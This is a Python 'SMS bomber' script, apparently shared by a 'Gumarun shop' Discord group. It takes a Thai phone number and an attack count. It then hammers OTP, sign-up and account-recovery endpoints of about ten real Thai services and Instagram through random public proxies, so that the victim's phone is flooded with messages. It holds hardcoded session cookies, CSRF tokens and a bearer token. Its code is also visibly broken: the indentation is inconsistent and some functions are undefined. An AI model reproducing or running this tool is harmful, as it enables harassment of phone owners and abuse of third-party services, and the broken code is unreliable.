import requests as ru
import threading
import requests
import time
import random
import os
import asyncio
from re import search
from requests import Session
from user_agent import generate_user_agent

# ล้างหน้าจอ
os.system("clear")

# กำหนด Header และ Proxy
headers = {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"
}
proxy = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt").text
with open("proxy.txt", "w") as f:
    f.write(proxy)
with open("proxy.txt", "r") as g:
    s = g.read().splitlines()


# ฟังก์ชันหลัก
async def home():
    print('''
   ▄████  █    ██   ███▄ ▄███▓ ▄▄▄      ██▀███   █    ██  ███▄    █ 
▒ ██▒ ▀█▒ ██  ▓██▒ ▓██▒▀█▀ ██▒▒████▄   ▓██ ▒ ██▒ ██  ▓██▒ ██ ▀█   █ 
░▒██░▄▄▄░▓██  ▒██░ ▓██    ▓██░▒██  ▀█▄ ▓██ ░▄█ ▒▓██  ▒██░▓██  ▀█ ██▒
░░▓█  ██▓▓▓█  ░██░ ▒██    ▒██ ░██▄▄▄▄██▒██▀▀█▄  ▓▓█  ░██░▓██▒  ▐▌██▒
░▒▓███▀▒░▒▒█████▓ ▒▒██▒   ░██▒ ▓█   ▓██░██▓ ▒██▒▒▒█████▓ ▒██░   ▓██░
 ░▒   ▒   ▒▓▒ ▒ ▒ ░░ ▒░   ░  ░ ▒▒   ▓▒█░ ▒▓ ░▒▓░ ▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒ 
  ░   ░   ░▒░ ░ ░ ░░  ░      ░  ░   ▒▒   ░▒ ░ ▒░ ░▒░ ░ ░ ░ ░░   ░ ▒░
░ ░   ░ ░  ░░ ░ ░  ░      ░     ░   ▒     ░   ░   ░░ ░ ░    ░   ░ ░ 
      ░     ░     ░       ░         ░     ░        ░              ░ 
                                    [Gumarun shop]
                          [https://discord.com/invite/hSbDP5Rmc8] 
    ''')
    phone = input(" \x1b[96m[PHONE-NUMBER]  : \x1b[92m")

    if int(phone) <= 99999999 or int(phone) >= 999999999:
        print()
        print('\x1b[92m[ NONAME ]\x1b[00m : \x1b[91mEnter a Thailand phone number [ ! ] \x1b[00m')
        time.sleep(1)
        os.system('clear')
    else:
        jam = int(input("\x1b[96m [AMOUNT-ATTACK] : \x1b[92m"))
        print()
        print()

        ru.post(
            "https://www.tgfone.com/signin/add_register",
            headers={
                "content-type": "application/x-www-form-urlencoded",
                "user-agent": generate_user_agent(),
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "cookie": "PHPSESSID=6d00c9f6d3b9b31a559fbc13edb560d4e571fb71"
            },
            data=f"mobile_form={phone}&password_form=as257400As&confirmpassword_form=as257400As&name_form=skkdmx&lastname_form=dkmsxm&stype=2"
        )

        
        def api1(phone):
            send = Session()
		          send.headers.update({"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'})
			         sms = send.post("https://api.jobbkk.com/v1/easy/otp_code",data="mobile="+phone,proxies={'http': 'http://' + random.choice(s)})
		         	print(f"\x1b[92m{sms}")
  
        def api2():
            r = requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4},proxies={'http': 'http://' + random.choice(s)})
            print(f"\x1b[92m{r}")
        def api3():
			r = requests.post("https://www.carsome.co.th/website/login/sendSMS",headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "amp_893e6b=w-newQWGaJ9H7YmD5KD1Jg...1g6l3e5ht.1g6l3e5ht.0.0.0;cky-active-check=yes;ajs_anonymous_id=bc6fbe42-9d69-40d9-93db-ba6b777861c1;_gcl_au=1.1.1543614339.1656418159;_ALGOLIA=anonymous-0a2bcc78-8c2b-4051-bfea-97cb347b1e17;__lt__cid=f282ddb1-0630-4c9e-ab88-27f6bd651a35;__lt__sid=530143c9-c9d21696;cookieyesID=R1V5aHU4eWswY21YbjM0NHFGb1FVc1pObDc3U2NSYkk=;moe_uuid=ff0db811-2642-4a84-83a3-7dd26d9c33a1;__cf_bm=4SQWD6XX3mlhMhXrkJ8A1.4MzqJ80OVt9BMJ9NH5uFw-1656418177-0-AdYubBhGil+XHg2/1J8WHy36qRL2urjlZUNUYGwGOkQyg0wlFLvwXAv8ugmj2IdM5ZaTfFxlz/2lRwsTuRRxnrQ=;cky-consent=no;cookieyes-necessary=yes;cookieyes-functional=no;cookieyes-analytics=no;cookieyes-performance=no;cookieyes-advertisement=no;cookieyes-other=no"},json={"username":phone,"optType":0},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api4():
			r = requests.get(f"https://nocnoc.com/authentication-service/user/OTP/verify-phone/%2B66{phone[5:]}?lang=th&userType=BUYER&locale=th&orgIdfier=scg&phone=%2B66{phone[5:]}&phoneCountryCode=%2B66&b-uid=1.0.760",headers={"authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..MSrqMX5S5Ui8NbGvEih2uw.NCJuqSPHzIwZ0Jy4Snq25pKUa887meHakzTe3YTCUnVsMwY8cQMnJ-nOr6Lbb5irc2gr8VfD0G2ZYocg22oVH36DdBnfoJirezzLuf9Uc2DiaQHLJ8OJY3UHo8fLUMB7BYe2w0Q5fDdMF1N0u8_aGA.ZNn49ubbJXSlycijnTncbQ"},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def ig_token():
			d=get("https://www.instagram.com/",headers=headers).headers['set-cookie']
			d=search("csrftoken=(.*);",d).group(1).split(";")
			return d[0],d[10].replace(" Secure, ig_did=","")
		def api5():
			token,_=ig_token()
			d=post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username=66{phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","X-CSRFToken":token}).json()
			print(f"\x1b[92m{d}")
		def api6():
			r = requests.post("https://api.freshket.co/baseApi/Users/RequestOtp",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Content-Type": "application/json;charset=UTF-8"},json={"isDev":"false","language":"th","phone":f"+66{phone[1:]}"},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api7():
			r = requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api8():
			r = requests.get(f"https://hdmall.co.th/phone_verifications?express_sign_in=1&mobile={phone}",proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api9():
			r = requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp", data={"mobile_phone_no":phone},proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")
		def api10():
			r = requests.get(f"https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number=0{phone}&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2",proxies={'http': 'http://' + random.choice(s)})
			print(f"\x1b[92m{r}")


        for _ in range(jam):
            threading.Thread(target=api1).start()
            threading.Thread(target=api2).start()

if __name__ == '__main__':
	asyncio.run(home())


